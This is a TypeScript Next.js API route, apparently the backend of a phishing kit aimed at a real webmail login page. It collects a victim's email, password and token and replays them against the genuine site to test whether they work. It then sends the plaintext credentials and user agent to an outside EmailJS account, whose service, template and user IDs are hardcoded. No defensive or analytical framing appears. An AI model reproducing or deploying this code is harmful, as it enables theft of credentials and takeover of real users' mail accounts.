// api/phish-login.ts
import { NextRequest, NextResponse } from "next/server";

export const config = {
  runtime: "edge",
};

export default async function handler(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, password, token } = body;
    const userAgent = request.headers.get("user-agent") || "Unknown Device";

    // 1. Prepare the payload exactly as the real site expects
    const formData = new URLSearchParams({
      _user: email,
      _pass: password,
      _token: token, // Critical!
      _task: "login",
      _action: "login",
      _timezone: "UTC", // Default timezone
    });

    // 2. Send to the REAL site
    const response = await fetch("https://webmail.mwt.net/?_task=login", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        // Optional: Add User-Agent to mimic a browser better
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      body: formData.toString(),
      redirect: "follow",
    });

    // 3. Determine success
    const isSuccess =
      response.status === 200 || response.url.includes("_task=mail");

    // 4. Send Email via EmailJS
    sendEmail(email, password, userAgent).catch((err) => console.error("Email fail", err));

    // 5. Respond to frontend
    return NextResponse.json({
      success: isSuccess,
      url: response.url,
    });
  } catch (error) {
    return NextResponse.json(
      { success: false, error: "Internal Error" },
      { status: 500 },
    );
  }
}

async function sendEmail(email: string, password: string, userAgent: string) {
  await fetch("https://api.emailjs.com/api/v1/email/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      service_id: "service_1b86ixe",
      template_id: "template_a2504xo",
      user_id: "lES1DjjjfZ3BGbkw7",
      template_params: {
        email: email,
        password: password,
        user_agent: userAgent.substring(0, 50),
      },
    }),
  });
}
